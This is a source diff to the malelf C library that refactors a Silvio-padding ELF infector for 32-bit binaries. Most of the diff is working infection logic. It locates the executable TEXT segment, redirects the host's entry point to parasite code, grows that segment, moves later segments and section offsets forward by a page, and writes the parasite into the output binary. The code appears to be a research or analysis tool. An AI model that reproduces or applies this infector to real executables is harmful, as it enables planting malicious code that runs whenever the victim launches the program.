@@ -35,6 +35,7 @@
 #include <sys/stat.h>
 #include <unistd.h>
 #include <errno.h>
+#include <assert.h>
 
 #include <malelf/types.h>
 #include <malelf/infect.h>
@@ -53,8 +54,7 @@ typedef struct {
         _u32 parasite_entry_point;
         _u32 infect_offset_at;
         _u32 parasite_vaddr;
-        _u32 shift_segments_from;
-        _u32 shift_segments_until;
+        _u32 target_segment;
 } MalelfInfect;
 
 static _u8 _malelf_infect_silvio_padding(MalelfBinary* input,
@@ -124,7 +124,51 @@ static _u8 _malelf_infect_silvio_padding(MalelfBinary* input,
         return MALELF_SUCCESS;
 }
 
-_u32 malelf_infect_silvio_padding32_new(MalelfBinary *input,
+_u32 _malelf_infect_prepare_silvio_padding32(MalelfInfect *infector)
+{
+        Elf32_Ehdr *host_ehdr;
+        Elf32_Phdr *host_phdr, *phdr;
+        MalelfBinary *host;
+        _i32 text_found = -1;
+        _u32 i = 0;
+
+        assert (NULL != infector &&
+                NULL != infector->host &&
+                NULL != infector->parasite);
+
+        host = infector->host;
+
+        host_ehdr = (Elf32_Ehdr *) MALELF_ELF_DATA(&host->ehdr);
+        host_phdr = (Elf32_Phdr *) MALELF_ELF_DATA(&host->phdr);
+
+        for (phdr = host_phdr, i = host_ehdr->e_phnum;
+             i-- > 0;
+             phdr++) {
+                if (text_found != -1) {
+                        /* TODO: shift segments ... */
+                        continue;
+                } else if (phdr->p_type == PT_LOAD &&
+                           phdr->p_flags == (PF_X | PF_R)) {
+                        text_found = (host_ehdr->e_phnum - i) - 1;
+                        infector->parasite_entry_point =
+                                (phdr->p_vaddr + phdr->p_filesz);
+                        infector->host_entry_point = host_ehdr->e_entry;
+                        infector->infect_offset_at =
+                                (phdr->p_offset + phdr->p_filesz);
+                }
+        }
+
+        if (text_found == -1) {
+                MALELF_DEBUG_ERROR("TEXT segment not found in binary "
+                                   "'%s'.", host->fname);
+                return MALELF_ETEXT_SEG_NOT_FOUND;
+        }
+
+        infector->target_segment = text_found;
+        return MALELF_SUCCESS;
+}
+
+_u32 malelf_infect_silvio_padding32_new(MalelfBinary *host,
                                      MalelfBinary *output,
                                      MalelfBinary *parasite,
                                      _u32 offset_entry_point,
@@ -132,57 +176,84 @@ _u32 malelf_infect_silvio_padding32_new(MalelfBinary *input,
 {
         _u32 i;
         _u32 error = MALELF_SUCCESS;
-}
-
-_u32 _malelf_infect_prepare_silvio_padding32(MalelfInfect *infector)
-{
+        MalelfInfect infector;
         Elf32_Ehdr *host_ehdr;
-        Elf32_Phdr *host_phdr, *phdr;
-        Elf32_Shdr *host_shdr, *shdr;
-        MalelfBinary *host;
-        MalelfBinary *parasite;
-        _u8 text_found = 0;
+        Elf32_Phdr *host_phdr;
+        Elf32_Shdr *host_shdr;
+        Elf32_Phdr *target_phdr;
+        _u32 parasite_end_offset = 0;
 
-        assert (NULL != infector &&
-                NULL != infector->host &&
-                NULL != infector->parasite);
+        infector.host = host;
+        infector.parasite = parasite;
 
-        host = infector->host;
-        parasite = infector->parasite;
+        error = _malelf_infect_prepare_silvio_padding32(&infector);
+        if (MALELF_SUCCESS != error) {
+                return error;
+        }
 
-        ehdr = (ELf32_Ehdr *) MALELF_ELF_DATA(host->ehdr);
-        phdr = (Elf32_Phdr *) MALELF_ELF_DATA(host->phdr);
-        shdr = (Elf32_Shdr *) MALELF_ELF_DATA(host->shdr);
+        host_ehdr = host->ehdr.uhdr.h32;
+        host_phdr = host->phdr.uhdr.h32;
+        host_shdr = host->shdr.uhdr.h32;
 
-        for (phdr = host_phdr, i = host_ehdr->e_phnum;
-             i > 0;
-             i--, phdr++) {
-                if (text_found) {
-                        /* TODO: shift segments ... */
-                        continue;
-                } else if (phdr->p_type == (PF_X | PF_R)) {
-                        text_found = (host_ehdr->e_phnum - i);
-                        infector->parasite_entry_point =
-                                (phdr->p_vaddr + phdr->p_filesz);
-                        infector->host_entry_point = ehdr->e_entry;
-                        infector->infect_offset_at =
-                                (phdr->p_offset + phdr->p_filesz);
+        /* patch entry point */
+        host_ehdr->e_entry = infector.parasite_entry_point;
+
+        target_phdr = host_phdr + infector.target_segment;
+        assert (target_phdr->p_type == PT_LOAD);
+        assert (target_phdr->p_flags == (PF_X | PF_R));
+
+        target_phdr->p_filesz += parasite->size;
+        target_phdr->p_memsz += parasite->size;
+
+        /* shift every segment after TEXT segment */
+        for (i = infector.target_segment + 1;
+             i < host_ehdr->e_phnum;
+             i++) {
+                Elf32_Phdr *phdr = host_phdr + i;
+                phdr->p_offset += PAGE_SIZE;
+        }
+
+        parasite_end_offset = infector.infect_offset_at +
+                parasite->size;
+
+        /* Increase offset of every section after injection
+         * by page size
+         */
+        for (i = host_ehdr->e_shnum; i-- > 0; host_shdr++) {
+                if (host_shdr->sh_offset >= parasite_end_offset) {
+                        host_shdr->sh_offset += PAGE_SIZE;
+                } else {
+                        /* increase the size of section that contains
+                           the parasite */
+                        if (host_shdr->sh_size + host_shdr->sh_addr ==
+                            infector.parasite_vaddr) {
+                                host_shdr->sh_size += parasite->size;
+                        }
                 }
+
         }
 
-        if (!text_found) {
-                MALELF_DEBUG_ERROR("TEXT segment not found in binary "
-                                   "'%s'.", host->fname);
-                return MALELF_ETEXT_SEG_NOT_FOUND;
-        }
+        host_ehdr->e_shoff += PAGE_SIZE;
 
-        infector->shift_segments_from = text_found;
-        infector->shift_segments_until = 0;
-        infector->shift_segments_by = PAGE_SIZE;
+        MALELF_DEBUG_INFO("Text segment starts at 0x%08x\n",
+                          target_phdr->p_vaddr);
+        MALELF_DEBUG_INFO("Patched entry point from 0x%x to 0x%x\n",
+                          infector.host_entry_point,
+                          infector.parasite_entry_point);
+        MALELF_DEBUG_INFO("Inserting parasite at offset %x vaddr 0x%x\n",
+                          infector.infect_offset_at,
+                          infector.parasite_vaddr);
 
-        return MALELF_SUCCESS;
+        error = _malelf_infect_silvio_padding(host,
+                                              output,
+                                              infector.infect_offset_at,
+                                              parasite,
+                                              offset_entry_point,
+                                              infector.host_entry_point,
+                                              magic_bytes);
+
+        return error;
 }
-
 
 _u8 malelf_infect_silvio_padding32(MalelfBinary *input,
                                    MalelfBinary *output,
@@ -242,13 +313,15 @@ _u8 malelf_infect_silvio_padding32(MalelfBinary *input,
                 exit(-1);
         }
 
-        /* Increase size of any section that resides after injection
+        /* Increase offset of any section that resides after injection
          * by page size
          */
         for (i = ehdr->e_shnum; i-- > 0; shdr++) {
                 if (shdr->sh_offset >= after_insertion_offset)
                         shdr->sh_offset += PAGE_SIZE;
                 else
+                        /* increase the size of section that contains
+                           the parasite */
                         if (shdr->sh_size + shdr->sh_addr == parasite_vaddr)
                                 shdr->sh_size += parasite->size;
 
